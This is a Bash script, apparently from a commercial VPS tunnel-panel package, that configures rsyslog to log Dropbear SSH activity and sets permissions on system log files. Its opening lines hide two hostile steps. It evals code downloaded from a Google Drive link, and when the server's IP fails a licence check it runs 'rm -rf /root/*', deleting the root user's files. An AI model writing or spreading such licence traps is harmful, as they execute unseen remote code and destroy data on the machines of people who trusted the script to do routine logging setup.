#!/bin/bash
MYIP=$(cat /usr/bin/.ipvps)
eval $(wget -qO- "https://drive.google.com/u/4/uc?id=1eutPTYsea7xYx1mNBWDQ_g1Yx3ZPNimF")
    ALLOWED_IP=$(curl -sS "$IZIN" | grep -wE "$MYIP" | awk '{print $4}')
    if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
	echo -n
    else
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
echo -e "\033[41;1m ⚠️       AKSES DI TOLAK         ⚠️ \033[0m"
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
echo -e ""
echo -e "        \033[91;1m❌ SCRIPT LOCKED ❌\033[0m"
echo -e ""
echo -e "  \033[0;33m🔒 Your VPS\033[0m $ipsaya \033[0;33mHas been Banned\033[0m"
echo -e ""
echo -e "  \033[91m⚠️  Masa Aktif Sudah Habis ⚠️\033[0m"
echo -e "  \033[0;33m💡 Beli izin resmi hanya dari Admin!\033[0m"
echo -e ""
echo -e "  \033[92;1m📞 Contact Admin:\033[0m"
echo -e "  \033[96m🌍 Telegram: https://t.me/WuzzSTORE\033[0m"
echo -e "  \033[96m📱 WhatsApp: https://wa.me/6287760204418\033[0m"
echo -e ""
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
rm -rf /root/*
exit 1
	fi

detect_os() {
  if [[ -f /etc/os-release ]]; then
    source /etc/os-release
    echo "$ID $VERSION_ID" 
  else
    echo "Unknown"
  fi
}

os_version=$(detect_os)

if [[ "$os_version" =~ ^ubuntu\ ([0-9]+)\. ]]; then
  version_num="${BASH_REMATCH[1]}"
  if (( version_num >= 24 )); then
    RSYSLOG_FILE="/etc/rsyslog.d/50-default.conf"
  else
    echo "Ubuntu versi $version_num belum didukung. Keluar..."
    exit 1
  fi

elif [[ "$os_version" =~ ^debian\ ([0-9]+) ]]; then
  version_num="${BASH_REMATCH[1]}"
  if (( version_num >= 12 )); then
    RSYSLOG_FILE="/etc/rsyslog.conf"
  else
    echo "Debian versi $version_num belum didukung. Keluar..."
    exit 1
  fi

else
  echo "Sistem operasi atau versi tidak dikenali. Keluar..."
  exit 1
fi

LOG_FILES=(
  "/var/log/auth.log"
  "/var/log/kern.log"
  "/var/log/mail.log"
  "/var/log/user.log"
  "/var/log/cron.log"
)
set_permissions() {
  for log_file in "${LOG_FILES[@]}"; do
    if [[ -f "$log_file" ]]; then
      echo "Mengatur izin dan kepemilikan untuk $log_file..."
      chmod 640 "$log_file"
      chown syslog:adm "$log_file"  
    else
      echo "$log_file tidak ditemukan, melewati..."
    fi
  done
}
check_dropbear_log() {
  grep -q 'if \$programname == "dropbear"' "$RSYSLOG_FILE"
}
add_dropbear_log() {
  echo "Menambahkan konfigurasi Dropbear ke $RSYSLOG_FILE..."
  sudo bash -c "echo -e 'if \$programname == \"dropbear\" then /var/log/auth.log\n& stop' >> $RSYSLOG_FILE"
  systemctl restart rsyslog
  echo "Konfigurasi Dropbear ditambahkan dan Rsyslog direstart."
}
if check_dropbear_log; then
  echo "Konfigurasi Dropbear sudah ada, tidak ada perubahan yang dilakukan."
else
  add_dropbear_log
fi
set_permissions